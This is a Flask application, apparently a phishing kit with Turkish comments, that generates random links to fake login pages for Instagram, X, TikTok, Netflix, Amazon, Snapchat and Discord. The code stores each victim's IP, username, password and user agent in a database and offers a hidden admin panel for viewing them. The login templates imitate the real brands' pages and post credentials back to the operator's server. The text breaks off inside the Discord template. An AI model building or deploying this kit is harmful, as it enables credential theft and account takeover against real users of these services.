from flask import Flask, render_template_string, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import random
import string
import socket

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///ipl.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)          

SECRET_ADMIN_PATH = "".join(random.choices(string.ascii_letters + string.digits, k=32))  # Rastgele oluştur
print(f"ADMIN PANEL URL: /admin/{SECRET_ADMIN_PATH}")  # Bu çıktıyı kaydedin

# DB modeli
class Link(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    site = db.Column(db.String(50))
    random_path = db.Column(db.String(50), unique=True)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class Visitor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip = db.Column(db.String(50))
    username = db.Column(db.String(100))
    password = db.Column(db.String(100))
    link_id = db.Column(db.Integer)
    user_agent = db.Column(db.String(200))
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

def random_string(length=8):
    chars = string.ascii_letters + string.digits
    while True:
        s = ''.join(random.choice(chars) for _ in range(length))
        if not Link.query.filter_by(random_path=s).first():
            return s

def get_public_ip():
    # Basit public IP tespiti
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Google DNS'e bağlanıp kendi IP'ni öğreniyoruz
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "localhost"
    finally:
        s.close()
    return ip

# HTML Template (inline CSS ve JS var)
HOME_HTML = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <link rel="icon" href="IPL.png" type="image/png" sizes="16x16">
    <link rel="icon" href="IPL.png" type="image/png" sizes="32x32">
    <link rel="apple-touch-icon" href="IPL.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IPL - Link Oluşturucu</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #4361ee;
            --secondary-color: #3f37c9;
            --accent-color: #4cc9f0;
            --dark-color: #212529;
            --light-color: #f8f9fa;
        }
        
        body {
            background-color: #f8f9fa;
            padding-top: 2rem;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .card {
            border-radius: 15px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            border: none;
            overflow: hidden;
            transition: transform 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
        }
        
        .card-header {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            color: white;
            padding: 1.5rem;
            position: relative;
            overflow: hidden;
        }
        
        .card-header::after {
            content: "";
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: var(--accent-color);
        }
        
        .card-header h3 {
            position: relative;
            z-index: 1;
            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .form-select, .btn-primary {
            border-radius: 10px;
            padding: 12px 15px;
            border: 2px solid #e9ecef;
            transition: all 0.3s ease;
        }
        
        .form-select:focus {
            border-color: var(--accent-color);
            box-shadow: 0 0 0 0.25rem rgba(67, 97, 238, 0.25);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
            border: none;
            font-weight: 600;
            letter-spacing: 0.5px;
            transition: all 0.3s ease;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.4);
        }
        
        .list-group-item {
            border-radius: 10px !important;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            border: none;
            background-color: white;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            transition: all 0.3s ease;
        }
        
        .list-group-item:hover {
            transform: translateX(5px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .link-text {
            font-family: 'Fira Code', monospace, sans-serif;
            word-break: break-all;
            color: var(--dark-color);
            flex-grow: 1;
            margin-right: 15px;
            font-size: 14px;
        }
        
        .copy-btn {
            border-radius: 8px;
            min-width: 100px;
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
            border: 2px solid #e9ecef;
            font-weight: 500;
        }
        
        .copy-btn:hover {
            background-color: var(--light-color);
            transform: translateY(-2px);
        }
        
        .copy-btn.copied {
            background-color: #28a745;
            color: white;
            border-color: #28a745;
        }
        
        .copy-btn.copied i {
            animation: bounce 0.5s;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }
        
        .admin-section {
            margin-top: 2rem;
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
            border-top: 4px solid var(--accent-color);
        }
        
        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #6c757d;
        }
        
        .empty-state i {
            font-size: 3rem;
            color: #dee2e6;
            margin-bottom: 15px;
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(67, 97, 238, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(67, 97, 238, 0); }
            100% { box-shadow: 0 0 0 0 rgba(67, 97, 238, 0); }
        }
        
        /* Tooltip styles */
        .tooltip-custom {
            position: fixed;
            background-color: var(--dark-color);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            z-index: 9999;
            opacity: 0;
            transform: translateY(10px);
            transition: all 0.3s ease;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        .tooltip-custom.show {
            opacity: 1;
            transform: translateY(0);
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-lg-8">
                <div class="card mb-4 pulse">
                    <div class="card-header text-center">
                        <h3><i class="fas fa-link me-2"></i>IPL Link Oluşturucu</h3>
                    </div>
                    <div class="card-body">
                        <form method="POST" id="form">
                            <div class="mb-4">
                                <select class="form-select" name="site" id="site" required>
                                    <option value="" disabled selected>Site Seçiniz</option>
                                    <option value="instagram">Instagram</option>
                                    <option value="x">X (Twitter)</option>
                                    <option value="tiktok">TikTok</option>
                                    <option value="amazon">Amazon</option>
                                    <option value="snapchat">Snapchat</option>
                                    <option value="discord">Discord</option>
                                    <option value="netflix">Netflix</option>
                                </select>
                            </div>
                            <button type="submit" class="btn btn-primary w-100 py-3">
                                <i class="fas fa-plus-circle me-2"></i>Link Oluştur
                            </button>
                        </form>

                        <div class="mt-5">
                            <h5 class="mb-4"><i class="fas fa-history me-2"></i>Oluşturulan Linkler</h5>
                            <div class="list-group" id="links-list">
                                {% for l in links %}
                                <div class="list-group-item">
                                    <span class="link-text">{{ base_url }}/site/{{ l.random_path }}</span>
                                    <button class="btn btn-outline-secondary copy-btn" data-link="{{ base_url }}/site/{{ l.random_path }}">
                                        <i class="fas fa-copy me-1"></i>Kopyala
                                    </button>
                                </div>
                                {% else %}
                                <div class="empty-state">
                                    <i class="fas fa-exclamation-circle mb-3"></i>
                                    <p class="mb-0">Henüz link oluşturulmadı.</p>
                                </div>
                                {% endfor %}
                            </div>
                        </div>
                    </div>
                </div>

                <div class="admin-section">
                    <h5 class="text-center mb-4"><i class="fas fa-lock me-2"></i>Admin Paneli</h5>
                    <div class="d-flex justify-content-between align-items-center">
                        <span class="link-text">{{ base_url }}/admin/{{ admin_path }}</span>
                        <button class="btn btn-outline-dark copy-btn" data-link="{{ base_url }}/admin/{{ admin_path }}">
                            <i class="fas fa-copy me-1"></i>Kopyala
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="custom-tooltip" class="tooltip-custom">Kopyalandı!</div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Copy functionality with improved UX
            document.querySelectorAll('.copy-btn').forEach(button => {
                button.addEventListener('click', function(e) {
                    const link = this.getAttribute('data-link');
                    copyToClipboard(link, e);
                });
            });
            
            // Add click animation to all buttons
            document.querySelectorAll('button').forEach(button => {
                button.addEventListener('click', function() {
                    this.classList.add('active');
                    setTimeout(() => {
                        this.classList.remove('active');
                    }, 300);
                });
            });
        });

        function copyToClipboard(text, event) {
            // Create temporary textarea for older browsers
            const textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            
            try {
                // Try modern clipboard API first
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(text).then(() => {
                        showTooltip(event);
                        updateButtonState(event.target);
                    }).catch(err => {
                        fallbackCopy(textarea, event);
                    });
                } else {
                    fallbackCopy(textarea, event);
                }
            } catch (err) {
                fallbackCopy(textarea, event);
            } finally {
                document.body.removeChild(textarea);
            }
        }
        
        function fallbackCopy(textarea, event) {
            try {
                const successful = document.execCommand('copy');
                if (successful) {
                    showTooltip(event);
                    updateButtonState(event.target);
                } else {
                    showTooltip(event, 'Manuel kopyalayın: Ctrl+C');
                }
            } catch (err) {
                showTooltip(event, 'Kopyalama hatası!');
            }
        }
        
        function showTooltip(event, message = 'Kopyalandı!') {
            const tooltip = document.getElementById('custom-tooltip');
            tooltip.textContent = message;
            tooltip.style.top = `${event.clientY - 50}px`;
            tooltip.style.left = `${event.clientX - (tooltip.offsetWidth / 2)}px`;
            tooltip.classList.add('show');
            
            setTimeout(() => {
                tooltip.classList.remove('show');
            }, 2000);
        }
        
        function updateButtonState(button) {
            const originalText = button.innerHTML;
            button.innerHTML = '<i class="fas fa-check me-1"></i>Kopyalandı!';
            button.classList.add('copied');
            
            setTimeout(() => {
                button.innerHTML = originalText;
                button.classList.remove('copied');
            }, 2000);
        }
    </script>
</body>
</html>
'''

INSTAGRAM_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 32px;
            margin-bottom: 32px;
            max-width: 935px;
            width: 100%;
        }
        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px 40px;
            margin-top: 12px;
            max-width: 350px;
            width: 100%;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .logo {
            margin: 22px auto 12px;
            width: 175px;
            display: block;
        }
        form {
            margin-top: 24px;
        }
        .input-field {
            margin-bottom: 6px;
            position: relative;
        }
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            color: #262626;
            font-size: 14px;
            padding: 12px 8px;
            width: 100%;
            transition: border-color 0.2s;
        }
        input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        button {
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-weight: 600;
            padding: 8px;
            width: 100%;
            margin-top: 12px;
            cursor: pointer;
            font-size: 14px;
            transition: background-color 0.2s;
        }
        button:hover {
            background-color: #0077c2;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
        }
        .line {
            background-color: #dbdbdb;
            height: 1px;
            flex-grow: 1;
        }
        .or {
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 0 18px;
            text-transform: uppercase;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin: 16px 0;
            text-align: center;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .fb-login i {
            margin-right: 8px;
            font-size: 18px;
        }
        .forgot-pw {
            color: #00376b;
            font-size: 12px;
            line-height: 14px;
            margin-top: 16px;
            text-align: center;
            cursor: pointer;
        }
        .signup {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            margin-top: 10px;
            max-width: 350px;
            width: 100%;
            text-align: center;
            font-size: 14px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
        }
        .signup a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .app-download {
            margin-top: 20px;
            text-align: center;
        }
        .app-download p {
            font-size: 14px;
            margin: 10px 20px;
            color: #262626;
        }
        .app-stores {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            gap: 10px;
        }
        .app-store {
            height: 40px;
            border-radius: 5px;
        }
        footer {
            margin-top: 24px;
            margin-bottom: 52px;
            max-width: 935px;
            width: 100%;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 8px 16px;
        }
        .footer-links a {
            color: #8e8e8e;
            font-size: 12px;
            text-decoration: none;
        }
        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 16px;
            text-align: center;
            text-transform: uppercase;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
            
            <form method="POST" action="/login/{{ random_path }}">
                <div class="input-field">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-field">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Log In</button>
            </form>
            
            <div class="divider">
                <div class="line"></div>
                <div class="or">or</div>
                <div class="line"></div>
            </div>
            
            <div class="fb-login">
                <i class="fab fa-facebook-square"></i> Log in with Facebook
            </div>
            
            <div class="forgot-pw">Forgot password?</div>
        </div>
        
        <div class="signup">
            Don't have an account? <a href="#">Sign up</a>
        </div>
        
        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-stores">
                <img class="app-store" src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                <img class="app-store" src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
            </div>
        </div>
    </div>
    
    <footer>
        <div class="footer-links">
            <a href="#">Meta</a>
            <a href="#">About</a>
            <a href="#">Blog</a>
            <a href="#">Jobs</a>
            <a href="#">Help</a>
            <a href="#">API</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Top Accounts</a>
            <a href="#">Hashtags</a>
            <a href="#">Locations</a>
            <a href="#">Instagram Lite</a>
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        <div class="copyright">
            English © 2023 Instagram from Meta
        </div>
    </footer>
</body>
</html>
'''
X_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>X. It's what's happening</title>
    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.2.ico">
    <style>
        body {
            background-color: #000;
            color: white;
            font-family: "Segoe UI", Roboto, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            background: #111;
            padding: 30px;
            border-radius: 10px;
            width: 320px;
        }
        .logo {
            font-size: 36px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: 1px solid #333;
            border-radius: 6px;
            background: #000;
            color: white;
        }
        button {
            width: 100%;
            margin-top: 15px;
            padding: 10px;
            border: none;
            background-color: #1d9bf0;
            color: white;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">𝕏</div>
        <form method="POST" action="/login/{{ random_path }}">
            <input type="text" name="username" placeholder="Phone, email or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
</body>
</html>
'''
TIKTOK_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TikTok - Make Your Day</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', sans-serif;
            background: linear-gradient(to right, #000, #111);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
        }
        .box {
            background: #222;
            padding: 30px;
            border-radius: 12px;
            width: 350px;
        }
        .logo {
            text-align: center;
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #444;
            border-radius: 8px;
            background: #000;
            color: white;
        }
        button {
            width: 100%;
            padding: 10px;
            border: none;
            background-color: #ff0050;
            color: white;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">TikTok</div>
        <form method="POST" action="/login/{{ random_path }}">
            <input type="text" name="username" placeholder="Email / Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''


SUCCESS_HTML = '''

'''
NETFLIX_HTML = '''
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix Türkiye - TV programlarını çevrimiçi izleyin, Filmleri çevrimiçi izleyin</title>
  <link rel="icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
  <style>
    /* Netflix'in resmi fontu */
    @font-face {
      font-family: 'Netflix Sans';
      src: url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Md.woff2') format('woff2');
      font-weight: 500;
    }
    @font-face {
      font-family: 'Netflix Sans';
      src: url('https://assets.nflxext.com/ffe/siteui/fonts/netflix-sans/v3/NetflixSans_W_Bd.woff2') format('woff2');
      font-weight: 700;
    }

    :root {
      --netflix-red: #e50914;
      --netflix-dark: #141414;
      --netflix-white: #fff;
      --netflix-gray: #737373;
      --netflix-light-gray: #b3b3b3;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    body {
      font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: rgba(0, 0, 0, 0.8);
      color: var(--netflix-white);
      min-height: 100vh;
      background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88b/a3873901-5b7c-46eb-b9fa-12fea5197bd3/TR-tr-20240311-popsignuptwoweeks-perspective_alpha_website_large.jpg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }

    .overlay {
      background-color: rgba(0, 0, 0, 0.5);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .header {
      padding: 20px 45px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .logo {
      height: 45px;
    }

    .language-selector {
      background-color: rgba(0, 0, 0, 0.4);
      color: var(--netflix-white);
      border: 1px solid var(--netflix-gray);
      padding: 8px 16px;
      border-radius: 4px;
      margin-right: 20px;
      font-size: 16px;
    }

    .signin-btn {
      background-color: var(--netflix-red);
      color: var(--netflix-white);
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 500;
      cursor: pointer;
    }

    .login-container {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .login-box {
      background-color: rgba(0, 0, 0, 0.75);
      border-radius: 4px;
      padding: 60px 68px;
      max-width: 450px;
      width: 100%;
    }

    .login-title {
      font-size: 32px;
      font-weight: 700;
      margin-bottom: 28px;
    }

    .form-group {
      margin-bottom: 16px;
      position: relative;
    }

    .form-control {
      width: 100%;
      padding: 16px 20px;
      background-color: var(--netflix-gray);
      border: none;
      border-radius: 4px;
      color: var(--netflix-white);
      font-size: 16px;
    }

    .form-control:focus {
      outline: none;
      background-color: #454545;
    }

    .form-control.error {
      border-bottom: 2px solid var(--netflix-red);
    }

    .error-message {
      color: #e87c03;
      font-size: 13px;
      margin-top: 6px;
      display: none;
    }

    .login-btn {
      width: 100%;
      padding: 16px;
      background-color: var(--netflix-red);
      color: var(--netflix-white);
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: 700;
      margin-top: 24px;
      cursor: pointer;
    }

    .login-btn:hover {
      background-color: #f40612;
    }

    .remember-help {
      display: flex;
      justify-content: space-between;
      margin-top: 12px;
      color: var(--netflix-light-gray);
      font-size: 13px;
    }

    .remember-me {
      display: flex;
      align-items: center;
    }

    .remember-me input {
      margin-right: 5px;
    }

    .help-link {
      color: var(--netflix-light-gray);
      text-decoration: none;
    }

    .signup-text {
      margin-top: 16px;
      color: var(--netflix-gray);
    }

    .signup-link {
      color: var(--netflix-white);
      text-decoration: none;
    }

    .signup-link:hover {
      text-decoration: underline;
    }

    .recaptcha {
      margin-top: 13px;
      font-size: 13px;
      color: var(--netflix-light-gray);
    }

    .recaptcha a {
      color: #0071eb;
      text-decoration: none;
    }

    .recaptcha a:hover {
      text-decoration: underline;
    }

    .footer {
      background-color: rgba(0, 0, 0, 0.75);
      padding: 30px 45px;
      margin-top: 90px;
    }

    .footer-content {
      max-width: 1000px;
      margin: 0 auto;
    }

    .contact {
      margin-bottom: 30px;
    }

    .contact a {
      color: #737373;
      text-decoration: none;
    }

    .contact a:hover {
      text-decoration: underline;
    }

    .footer-links {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 15px;
      margin-bottom: 20px;
    }

    @media (max-width: 740px) {
      .footer-links {
        grid-template-columns: repeat(2, 1fr);
      }
    }

    .footer-link {
      color: #737373;
      font-size: 13px;
      text-decoration: none;
    }

    .footer-link:hover {
      text-decoration: underline;
    }

    .language-selector-footer {
      margin-bottom: 20px;
    }

    .copyright {
      color: #737373;
      font-size: 11px;
    }

    @media (max-width: 740px) {
      .header {
        padding: 15px;
      }
      
      .login-box {
        padding: 15px;
        margin-top: 0;
      }
      
      .login-title {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="overlay">
    <header class="header">
      <div>
        <svg class="logo" viewBox="0 0 111 30" fill="#e50914">
          <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
        </svg>
      </div>
      <div>
        <select class="language-selector">
          <option value="tr">Türkçe</option>
          <option value="en">English</option>
        </select>
        <button class="signin-btn">Oturum Aç</button>
      </div>
    </header>

    <div class="login-container">
      <div class="login-box">
        <h1 class="login-title">Oturum Aç</h1>
        <form method="post" action="/post/netflix">
          <div class="form-group">
            <input type="email" class="form-control" name="email" placeholder="E-posta veya telefon numarası" required>
            <div class="error-message">Lütfen geçerli bir e-posta adresi veya telefon numarası girin.</div>
          </div>
          <div class="form-group">
            <input type="password" class="form-control" name="password" placeholder="Şifre" required>
            <div class="error-message">Şifreniz 4 ile 60 karakter arasında olmalıdır.</div>
          </div>
          <button type="submit" class="login-btn">Oturum Aç</button>
          <div class="remember-help">
            <div class="remember-me">
              <input type="checkbox" id="remember" name="remember">
              <label for="remember">Beni hatırla</label>
            </div>
            <a href="#" class="help-link">Yardım ister misiniz?</a>
          </div>
        </form>
        <div class="signup-text">
          Netflix'e katılmak ister misiniz? <a href="#" class="signup-link">Şimdi kaydolun</a>.
        </div>
        <div class="recaptcha">
          Bu sayfa robot olmadığınızı kanıtlamak için Google reCAPTCHA ile korunuyor. <a href="#">Daha fazlasını öğrenin.</a>
        </div>
      </div>
    </div>

    <footer class="footer">
      <div class="footer-content">
        <div class="contact">
          Sorularınız mı var? <a href="#">0850-390-7444</a> numaralı telefonu arayın
        </div>
        <div class="footer-links">
          <a href="#" class="footer-link">SSS</a>
          <a href="#" class="footer-link">Yardım Merkezi</a>
          <a href="#" class="footer-link">Netflix Shop</a>
          <a href="#" class="footer-link">Kullanım Koşulları</a>
          <a href="#" class="footer-link">Gizlilik</a>
          <a href="#" class="footer-link">Çerez Tercihleri</a>
          <a href="#" class="footer-link">Kurumsal Bilgiler</a>
          <a href="#" class="footer-link">Hız Testi</a>
        </div>
        <div class="language-selector-footer">
          <select class="language-selector">
            <option value="tr">Türkçe</option>
            <option value="en">English</option>
          </select>
        </div>
        <div class="copyright">
          Netflix Türkiye
        </div>
      </div>
    </footer>
  </div>
</body>
</html>
'''
AMAZON_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Amazon Sign-In</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='css/amazon.css') }}">
</head>
<style>
body {
  font-family: Arial, sans-serif;
  background-color: #fff;
  margin: 0;
  padding: 0;
}
.container {
  width: 300px;
  margin: 60px auto;
  text-align: center;
}
.logo {
  width: 100px;
  margin-bottom: 20px;
}
.form-box {
  border: 1px solid #ccc;
  padding: 20px;
  text-align: left;
}
input {
  width: 100%;
  padding: 8px;
  margin-top: 8px;
  margin-bottom: 12px;
}
button {
  width: 100%;
  background-color: #f0c14b;
  border: 1px solid #a88734;
  padding: 10px;
  font-weight: bold;
}
.help {
  margin-top: 15px;
  font-size: 12px;
  color: #0066c0;
}
</style>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="logo">
    <div class="form-box">
      <h1>Sign-In</h1>
      <form method="post" action="/post/amazon">
        <label>Email or mobile phone number</label>
        <input type="text" name="username" required>
        <button type="submit">Continue</button>
      </form>
    </div>
    <div class="help">Need help?</div>
  </div>
</body>
</html>

'''
SNAPCHAT_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Snapchat Login</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='css/snapchat.css') }}">
</head>
<style>body {
  background-color: #fffc00;
  font-family: sans-serif;
  margin: 0;
  padding: 0;
}
.login-box {
  width: 300px;
  margin: 100px auto;
  background: white;
  padding: 30px;
  border-radius: 10px;
  text-align: center;
}
input {
  width: 90%;
  margin: 10px 0;
  padding: 10px;
}
button {
  background-color: black;
  color: white;
  padding: 10px;
  width: 100%;
  border: none;
  font-weight: bold;
}
 </style>
<body>
  <div class="login-box">
    <h2>Log in to Snapchat</h2>
    <form method="post" action="/post/snapchat">
      <label>Username or Email</label>
      <input type="text" name="username" required>
      <label>Password</label>
      <input type="password" name="password" required>
      <button type="submit">Log In</button>
    </form>
  </div>
</body>
</html>

'''
DISCORD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Discord</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='css/discord.css') }}">
</head>
<style>body {
  background-color: #36393f;
  color: white;
  font-family: 'Helvetica Neue', sans-serif;
}
.login-box {
  width: 400px;
  margin: 100px auto;
  background-color: #2f3136;
  padding: 40px;
  border-radius: 8px;
}
input {
